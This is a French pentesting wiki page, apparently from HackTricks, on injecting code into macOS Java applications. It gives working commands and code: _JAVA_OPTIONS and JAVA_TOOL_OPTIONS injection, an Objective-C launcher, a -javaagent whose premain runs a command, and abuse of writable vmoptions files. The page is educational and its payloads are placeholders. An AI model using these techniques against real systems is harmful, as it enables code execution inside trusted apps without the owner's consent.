# Injection d'applications Java macOS

{{#include ../../../banners/hacktricks-training.md}}

## Énumération

Trouvez les applications Java installées sur votre système. Il a été constaté que les applications Java dans **Info.plist** contiennent certains paramètres Java qui incluent la chaîne **`java.`** ; vous pouvez donc effectuer une recherche sur celle-ci :
```bash
# Search only in /Applications folder
sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null

# Full search
sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
```
## \_JAVA_OPTIONS

La variable d’environnement **`_JAVA_OPTIONS`** peut être utilisée pour injecter des paramètres arbitraires de Java VM au démarrage d’une application Java.<sup>[[1]](#references)</sup>

La pile de lancement Java reconnaît également deux variables mieux définies, avec des portées différentes :

- `JAVA_TOOL_OPTIONS` est lue lors de la création de la VM, y compris pour certains chemins de lancement intégrés qui ne passent pas par le launcher `java`. Elle peut injecter des options d’instrumentation telles que `-javaagent`, `-agentlib` ou `-agentpath`.<sup>[[4]](#references)</sup>
- `JDK_JAVA_OPTIONS` est ajoutée par le launcher `java` au début de sa ligne de commande. Les options qui sélectionnent la classe principale ou terminent le launcher sont interdites, mais `-javaagent` est accepté.<sup>[[5]](#references)</sup>

Ces trois variables doivent être considérées comme des contrôles d’exécution de code de la JVM lorsqu’un attaquant peut également fournir un agent compatible et lisible. `_JAVA_OPTIONS` est un détail d’implémentation de HotSpot : validez-le donc par rapport au vendor et à la version exacts ; `JAVA_TOOL_OPTIONS` ou `JDK_JAVA_OPTIONS` sont préférables pour des tests portables.
```bash
# Write your payload in a script called /tmp/payload.sh
export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
```
Pour l’exécuter en tant que nouveau processus et non en tant qu’enfant du terminal actuel, vous pouvez utiliser :
```objectivec
#import <Foundation/Foundation.h>
// clang -fobjc-arc -framework Foundation invoker.m -o invoker

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Specify the file path and content
NSString *filePath = @"/tmp/payload.sh";
NSString *content = @"#!/bin/bash\n/Applications/iTerm.app/Contents/MacOS/iTerm2";

NSError *error = nil;

// Write content to the file
BOOL success = [content writeToFile:filePath
atomically:YES
encoding:NSUTF8StringEncoding
error:&error];

if (!success) {
NSLog(@"Error writing file at %@\n%@", filePath, [error localizedDescription]);
return 1;
}

NSLog(@"File written successfully to %@", filePath);

// Create a new task
NSTask *task = [[NSTask alloc] init];

/// Set the task's launch path to use the 'open' command
[task setLaunchPath:@"/usr/bin/open"];

// Arguments for the 'open' command, specifying the path to Android Studio
[task setArguments:@[@"/Applications/Android Studio.app"]];

// Define custom environment variables
NSDictionary *customEnvironment = @{
@"_JAVA_OPTIONS": @"-Xms2m -Xmx5m -XX:OnOutOfMemoryError=/tmp/payload.sh"
};

// Get the current environment and merge it with custom variables
NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary:[[NSProcessInfo processInfo] environment]];
[environment addEntriesFromDictionary:customEnvironment];

// Set the task's environment
[task setEnvironment:environment];

// Launch the task
[task launch];
}
return 0;
}
```
Cependant, cette technique déclenche une erreur dans l'application exécutée. Une alternative plus furtive consiste à créer un agent Java et à utiliser `-javaagent`:<sup>[[2]](#references)</sup>
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"

# The same agent with the standardized VM initialization variable:
JAVA_TOOL_OPTIONS='-javaagent:/tmp/Agent.jar' java -jar /path/to/application.jar

# Or through the JDK java launcher:
JDK_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar' java -jar /path/to/application.jar
```
> [!CAUTION]
> La création de l’agent avec une **version différente de Java** de celle de l’application peut faire planter l’agent et l’application.

L’agent peut se trouver dans :
```java:Agent.java
import java.io.*;
import java.lang.instrument.*;

public class Agent {
public static void premain(String args, Instrumentation inst) {
try {
String[] commands = new String[] { "/usr/bin/open", "-a", "Calculator" };
Runtime.getRuntime().exec(commands);
}
catch (Exception err) {
err.printStackTrace();
}
}
}
```
Pour compiler l’agent, exécutez :
```bash
javac Agent.java # Create Agent.class
jar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar
```
Avec `manifest.txt` :
```
Premain-Class: Agent
Agent-Class: Agent
Can-Redefine-Classes: true
Can-Retransform-Classes: true
```
Ensuite, exportez la variable d'environnement et exécutez l'application Java comme suit :
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
```
## vmoptions file

Ce fichier permet de spécifier des **paramètres Java** lors de l'exécution de Java. Vous pouvez utiliser certaines techniques précédentes pour modifier les paramètres Java et **faire exécuter des commandes arbitraires au processus**.\
De plus, ce fichier peut également **inclure d'autres fichiers** avec la directive `include`, ce qui vous permet aussi de modifier un fichier inclus.

Plus encore, certaines applications Java **chargent plusieurs fichiers `vmoptions`**.

Certaines applications, comme Android Studio, indiquent dans leur **sortie où elles recherchent** ces fichiers :<sup>[[3]](#references)</sup>
```bash
/Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions

2023-12-13 19:53:23.920 studio[74913:581359] fullFileName is: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] fullFileName exists: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.921 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app.vmoptions
2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
```
Si ce n’est pas le cas, vous pouvez le vérifier avec :
```bash
# Monitor
sudo eslogger lookup | grep vmoption # Give FDA to the Terminal

# Launch the Java app
/Applications/Android\ Studio.app/Contents/MacOS/studio
```
Notez que Android Studio essaie dans cet exemple de charger **`/Applications/Android Studio.app.vmoptions`**, un emplacement où tout utilisateur du groupe **`admin` dispose d’un accès en écriture**.

## References

- [1] [OpenJDK — analyse de `_JAVA_OPTIONS` dans `arguments.cpp`](https://cr.openjdk.org/~never/bsd_headers/src/share/vm/runtime/arguments.cpp.html)
- [2] [Oracle Java — spécification du package `java.lang.instrument`](https://docs.oracle.com/javase/8/docs/api/java/lang/instrument/package-summary.html)
- [3] [JetBrains — Configuration des options JVM et des propriétés de plateforme](https://intellij-support.jetbrains.com/hc/en-us/articles/206544869-Configuring-JVM-options-and-platform-properties)
- [4] [Oracle Java — `JAVA_TOOL_OPTIONS`](https://docs.oracle.com/javase/8/docs/technotes/guides/troubleshoot/envvars002.html)
- [5] [Le lanceur `java` — `JDK_JAVA_OPTIONS`](https://docs.oracle.com/en/java/javase/25/docs/specs/man/java.html#using-the-jdk_java_options-launcher-environment-variable)
{{#include ../../../banners/hacktricks-training.md}}
